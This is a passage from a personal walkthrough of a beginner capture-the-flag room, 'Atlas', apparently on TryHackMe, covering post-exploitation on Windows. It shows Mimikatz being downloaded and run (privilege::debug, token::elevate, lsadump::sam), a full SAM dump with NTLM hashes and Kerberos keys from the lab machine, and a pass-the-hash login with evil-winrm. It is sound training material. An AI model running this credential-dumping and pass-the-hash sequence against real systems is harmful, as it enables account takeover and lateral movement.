NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288        

:)



```

![[Pasted image 20230101230304.png]]

###  Attack Post Exploitation

Awesome -- we have admin access! Now what do we do with it?

The classic thing to do here would be to try to dump the password hashes from the machine. In a network scenario these could come in handy for lateral movement. They also give us a way to prove our access to a client as Windows ([Serious Sam](https://www.rapid7.com/blog/post/2021/07/21/microsoft-sam-file-readability-cve-2021-36934-what-you-need-to-know/) vulnerability aside) prevents anyone from accessing this information if they don't have the highest possible privileges.

The most commonly used tool to dump password hashes on Windows is [Mimikatz](https://github.com/gentilkiwi/mimikatz) by the legendary [Benjamin Delpy](https://twitter.com/gentilkiwi/). The go-to tool for Windows post-exploitation: few tools are more iconic or more well-known than Mimikatz.

Answer the questions below

First up, let's get an up-to-date copy of Mimikatz to our attacking machine. The code for the tool is publicly available on Github, but fortunately for the sake of simplicity, there are also pre-compiled versions available for download.

Go to the [releases page](https://github.com/gentilkiwi/mimikatz/releases) for Mimikatz and find the latest release at the top of the list. Download the file called `mimikatz_trunk.zip` to your attacking machine.

_**Note:** Certain browsers block the repository as being malicious. You're a hacker -- of course it's malicious. Just continue to the page anyway: it's perfectly safe._  

 Completed

Make sure that the zip file is in your `/tmp` directory, then unzip it with `unzip mimikatz_trunk.zip`:

Unzipping Mimikatz

```shell-session
pentester@attacker:/tmp$ unzip mimikatz_trunk.zip 
Archive:  mimikatz_trunk.zip
  inflating: kiwi_passwords.yar      
  inflating: mimicom.idl             
  inflating: README.md               
   creating: Win32/
  inflating: Win32/mimidrv.sys       
  inflating: Win32/mimikatz.exe      
  inflating: Win32/mimilib.dll       
  inflating: Win32/mimilove.exe      
  inflating: Win32/mimispool.dll     
   creating: x64/
  inflating: x64/mimidrv.sys         
  inflating: x64/mimikatz.exe        
  inflating: x64/mimilib.dll         
  inflating: x64/mimispool.dll
```

 Completed

Now we can get to work!

Switch back into your RDP session and (using the elevated Command Shell we obtained in the last task) execute the following command to start Mimikatz:  
`\\tsclient\share\x64\mimikatz.exe`

If this is successful then you should get some pretty ASCII art and a new terminal prompt:

Mimikatz Prompt

```powershell
  
PS C:\Windows\system32> \\tsclient\share\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Correct Answer

When we start Mimikatz we usually have to execute two commands before we start dumping hashes:

-    `privilege::debug` -- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
-   `token::elevate` -- simply put, this takes us from our administrative shell with high privileges into a `SYSTEM` level shell with maximum privileges. This is something that we have a _right_ to do as an administrator, but that is not usually possible using normal Windows operations.  
    

With these commands executed, we are ready to dump some passwords hashes!  

 Completed

There are a variety of commands we _could_ use here, all of which do slightly different things. The command that we _will_ use is: `lsadump::sam`.

When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list:

Using Mimikatz

```html
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

---

mimikatz # lsadump::sam
Domain : GAIA
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
Local SID : S-1-5-21-1966530601-3185510712-10604624

SAMKey : 6e708461100b4988991ce3b4d8b1784e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: [REDACTED]
```

 Completed

```
┌──(kali㉿kali)-[~]
└─$ locate mimikatz.exe
/home/kali/Downloads/learning_kerberos/mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
                                                                                                              
┌──(kali㉿kali)-[~]
└─$ cd /tmp                      
                                                                                                              
┌──(kali㉿kali)-[/tmp]
└─$ cp /home/kali/Downloads/learning_kerberos/mimikatz.exe mimikatz.exe
                                                                                                              
┌──(kali㉿kali)-[/tmp]
└─$ ls                 
burp12619999519564320901.tmp
burp1764061989733424759.tmp
CVE-2021-1675
hsperfdata_kali
mimikatz.exe


C:\Windows\system32>\\tsclient\share\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # toke::elevate
ERROR mimikatz_doLocal ; "toke" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

676     {0;000003e7} 1 D 24790          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;001ffd0e} 1 F 2225029     GAIA\adm1n      S-1-5-21-1966530601-3185510712-10604624-1009    (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2261912     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : GAIA
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
Local SID : S-1-5-21-1966530601-3185510712-10604624

SAMKey : 6e708461100b4988991ce3b4d8b1784e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: c16444961f67af7eea7e420b65c8c3eb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : efd8f5fd23c3b910ef609e3e872276c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : CHANGE-MY-HOSTNAMEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c3bfc4a1912ab98abb75ad9d11aa511e30673f6c495066a811032df9756b9f3e
      aes128_hmac       (4096) : 6fbcc5a35c6507e1dd2c51521557b3b6
      des_cbc_md5       (4096) : 9ba7cdb3972013cd
    OldCredentials
      aes256_hmac       (4096) : 9484aadacd6c5994aed633bf92b6b3db31c57c932d2cd84a7fa635a0b3262806
      aes128_hmac       (4096) : cdda685dd630dd0796e5ddf38e22dce5
      des_cbc_md5       (4096) : 08340db613fb46b5
    OlderCredentials
      aes256_hmac       (4096) : 50141e3b3b449512e393a66c32e7f89a131744eef5d8a3f6a8576919a810cda3
      aes128_hmac       (4096) : 0d717b42dbaf77bb7248b4bebf8bb3a6
      des_cbc_md5       (4096) : bc23a20170542f25

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : CHANGE-MY-HOSTNAMEAdministrator
    Credentials
      des_cbc_md5       : 9ba7cdb3972013cd
    OldCredentials
      des_cbc_md5       : 08340db613fb46b5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f0 (1008)
User : Atlas
  Hash NTLM: 95ab4a5008e6266db4124279bbf2d70c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9a29c51aca19edf492ca5543c224fd93

* Primary:Kerberos-Newer-Keys *
    Default Salt : GAIAAtlas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 31b9d2630afe8409043cf0aff5d14cac90b2b12655be040bb11de51ca098ecaa
      aes128_hmac       (4096) : f1907d517c4a8cc9cb5e2c4607a47f2c
      des_cbc_md5       (4096) : f8efef5e3ece8076
    OldCredentials
      aes256_hmac       (4096) : ba311b1a6f964cdcb2988045aad04074458aab5264fdbdb394a6614476353350
      aes128_hmac       (4096) : 1a8cb078c086419390f2dfc8e81e3e18
      des_cbc_md5       (4096) : dff41c61ea4967c8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GAIAAtlas
    Credentials
      des_cbc_md5       : f8efef5e3ece8076
    OldCredentials
      des_cbc_md5       : dff41c61ea4967c8


RID  : 000003f1 (1009)
User : adm1n
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : af8c2d6247a6b1051a42beddb0c59540

* Primary:Kerberos-Newer-Keys *
    Default Salt : GAIAadm1n
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c8c242756234f40bcc0f4fd115fde31bf7103b57f0a3e9d4b687878908132548
      aes128_hmac       (4096) : 93b364e4c0918b89ac64d429ceb37283
      des_cbc_md5       (4096) : bc3215971f7c4525

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GAIAadm1n
    Credentials
      des_cbc_md5       : bc3215971f7c4525


┌──(kali㉿kali)-[/tmp]
└─$ evil-winrm -i 10.10.196.63 -u Administrator -H "c16444961f67af7eea7e420b65c8c3eb" -N

Evil-WinRM shell v3.4

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint

...

```


What is the Administrator account's NTLM password hash?

*c16444961f67af7eea7e420b65c8c3eb*


### Conclusion Final Thoughts

Congratulations -- you hacked Atlas!

This was a beginner box which has hopefully provided you with some skills which will prove useful as you progress in your hacking journey. We covered initial exploitation of outdated software, as well as exploiting the Windows PrintSpooler and dumping password hashes with Mimikatz.

Kudos for completing the room: now go hack some more!  

Answer the questions below

I hacked Atlas!



[[NoSQL injection Basics]]